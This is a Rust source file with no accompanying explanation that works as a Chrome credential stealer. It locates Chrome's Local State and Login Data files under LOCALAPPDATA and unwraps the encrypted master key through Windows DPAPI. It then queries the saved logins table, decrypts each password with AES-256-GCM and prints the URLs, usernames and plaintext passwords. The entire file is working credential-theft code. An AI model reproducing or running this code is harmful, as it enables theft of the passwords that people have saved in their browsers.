use aes_gcm::aead::{generic_array::GenericArray, Aead};
use aes_gcm::{Aes256Gcm, KeyInit};
use base64::{engine::general_purpose, Engine};
use serde_json::{from_str, Value};
use std::fs::read_to_string;
use std::path::PathBuf;
use std::{env, str::from_utf8};
use winapi::um::dpapi::CryptUnprotectData;
use winapi::um::wincrypt::CRYPTOAPI_BLOB;

//unprotect(decode) decoded key
fn unprotect_key(mut encrypted_key: Vec<u8>) -> Vec<u8> {
    let mut key_data = CRYPTOAPI_BLOB {
        cbData: encrypted_key.len() as u32,
        pbData: encrypted_key.as_mut_ptr(),
    };
    let mut key_data_out = CRYPTOAPI_BLOB {
        cbData: 0,
        pbData: std::ptr::null_mut(),
    };
    unsafe {
        CryptUnprotectData(
            &mut key_data,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            &mut key_data_out,
        );
        Vec::from_raw_parts(
            key_data_out.pbData,
            key_data_out.cbData as usize,
            key_data_out.cbData as usize,
        )
    }
}

// Fetches local_state and base64-decode key from json
// fn fetch_main_key(local_state_path: PathBuf) -> Vec<u8> {
//     let local_state = read_to_string(local_state_path).unwrap();
//     let local_obj: Value = from_str(&local_state).unwrap();
//     let encrypted_key = local_obj["os_crypt"]["encrypted_key"].as_str().unwrap();
//     let encrypted_key = general_purpose::STANDARD.decode(encrypted_key).unwrap()[5..].to_vec();
//     // println!("{:?}", encrypted_key);
//     unprotect_key(encrypted_key)
// }

// Fetches Login_data(db) file and extract url,username and encrypted password blob
// fn get_password(login_data_path: PathBuf, key: &[u8]) -> Vec<Vec<String>> {
//     let dbconn = sqlite::Connection::open(login_data_path).unwrap();
//     let query = "SELECT action_url, username_value, password_value FROM logins";
//     let mut statement = dbconn.prepare(query).unwrap();
//     let mut logins = Vec::new();
//     while let sqlite::State::Row = statement.next().unwrap(){
//         let url = statement.read(0).unwrap();
//         let username = statement.read(1).unwrap();
//         let password = statement.read(2).unwrap();
//         let password = from_utf8(&cipher_decrypt(key, password)).unwrap().to_string();
//         logins.push(vec![url,username,password]);
//     }
//     logins
// }

fn cipher_decrypt(key: &[u8], data: Vec<u8>) -> Vec<u8> {
    let key = GenericArray::from_slice(key);
    let cipher = Aes256Gcm::new(key);
    let nonce = GenericArray::from_slice(&data[3..15]);
    match cipher.decrypt(nonce, data[15..].as_ref()) {
        Ok(data) => data,
        Err(_) => unprotect_key(data),
    }
}

fn main() {
    let user_profile = env::var("LOCALAPPDATA").unwrap();
    let local_state_path =
        PathBuf::from(&user_profile).join("Google/Chrome/User Data/Local State");
    let login_data_path =
        PathBuf::from(&user_profile).join("Google/Chrome/User Data/Default/Login Data");

    // let main_key = fetch_main_key(local_state_path);
    // let password = get_password(login_data_path, &main_key);

    // for i in password{
    //     println!("{:#?}", i);
    // }
    // fetch main
    let local_state = read_to_string(local_state_path).unwrap();
    let local_obj: Value = from_str(&local_state).unwrap();
    let encrypted_key = local_obj["os_crypt"]["encrypted_key"].as_str().unwrap();
    let encrypted_key = general_purpose::STANDARD.decode(encrypted_key).unwrap()[5..].to_vec();
    // println!("{:?}", encrypted_key);
    let main_key = unprotect_key(encrypted_key);
    //get pass fn
    let dbconn = sqlite::Connection::open(login_data_path).unwrap();
    let query = "SELECT action_url, username_value, password_value FROM logins";
    let mut statement = dbconn.prepare(query).unwrap();
    let mut logins = Vec::new();
    while let sqlite::State::Row = statement.next().unwrap() {
        let url = statement.read(0).unwrap();
        let username = statement.read(1).unwrap();
        let password = statement.read(2).unwrap();
        let password = from_utf8(&cipher_decrypt(&main_key, password))
            .unwrap()
            .to_string();
        logins.push(vec![url, username, password]);
    }
    for i in logins {
        println!("{:?}", i);
    }
}